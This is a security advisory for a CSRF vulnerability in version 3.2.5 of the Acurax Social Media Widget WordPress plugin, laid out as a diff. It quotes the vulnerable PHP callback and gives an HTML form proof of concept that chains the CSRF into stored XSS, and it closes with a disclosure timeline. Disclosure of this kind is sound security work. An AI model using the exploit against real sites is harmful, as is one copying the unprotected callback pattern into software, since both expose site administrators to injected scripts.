@@ -1,0 +1,74 @@
+* Exploit Title: Social Media Widget by Acurax [CSRF]
+* Discovery Date: 2017-12-12
+* Exploit Author: Panagiotis Vagenas
+* Author Link: https://twitter.com/panVagenas
+* Vendor Homepage: http://www.acurax.com/
+* Software Link: https://wordpress.org/plugins/acurax-social-media-widget
+* Version: 3.2.5
+* Tested on: WordPress 4.9.1
+* Category: WebApps, WordPress
+
+
+Description
+-----------
+
+Plugin implements AJAX action `acx_asmw_saveorder` which calls back the
+function `acx_asmw_saveorder_callback`. The later does not implement any
+anti-CSRF controls thus allowing a malicious actor to perform an attack
+that could update plugin specific option `social_widget_icon_array_order`.
+
+Vulnerable param is `$_POST['recordsArray']` and it is saved as an
+option with the name `social_widget_icon_array_order`.
+
+Leveraging a CSRF could lead to a Persistent XSS (see PoC). Payload will
+be served when a user with the right privileges visits plugin's settings
+page (`wp-admin/admin.php?page=Acurax-Social-Widget-Settings`).
+
+Vulnerable code is located in file
+`acurax-social-media-widget/function.php` line 993:
+
+```
+function acx_asmw_saveorder_callback() {
+    global $wpdb;
+    $social_widget_icon_array_order = $_POST['recordsArray'];
+    if ( current_user_can( 'manage_options' ) ) {
+        $social_widget_icon_array_order = serialize(
+$social_widget_icon_array_order );
+        update_option( 'social_widget_icon_array_order',
+$social_widget_icon_array_order );
+        echo "<div id='acurax_notice' align='center' style='width:
+420px; font-family: arial; font-weight: normal; font-size: 22px;'>";
+        echo "Social Media Icon's Order Saved";
+        echo "</div><br>";
+    }
+    die(); // this is required to return a proper result
+}
+
+add_action( 'wp_ajax_acx_asmw_saveorder', 'acx_asmw_saveorder_callback' );
+
+```
+
+PoC
+---
+
+In this PoC we leverage the CSRF vulnerabilityt o perform a Persistent
+XSS attack. The payload is available in plugin's settings.
+
+```
+<pre class="lang:html decode:true "><form method="post" action="http://vuln.test/wp-admin/admin-ajax.php">
+    <input type="hidden" name="action" value="acx_asmw_saveorder">
+    <input type="text" name="recordsArray[]" value="1'><script>alert(1);</script>">
+    <button type="submit" value="Submit">Submit</button>
+</form>
+
+```
+
+Timeline
+--------
+
+1. **2017-12-12**: Discovered
+2. **2017-12-12**: Tried to contact plugin's vendor through the contact
+form on their website
+3. **2017-12-12**: Vendor replied
+4. **2017-12-12**: Vendor Received Details
+5. **2018-01-02**: Patch released
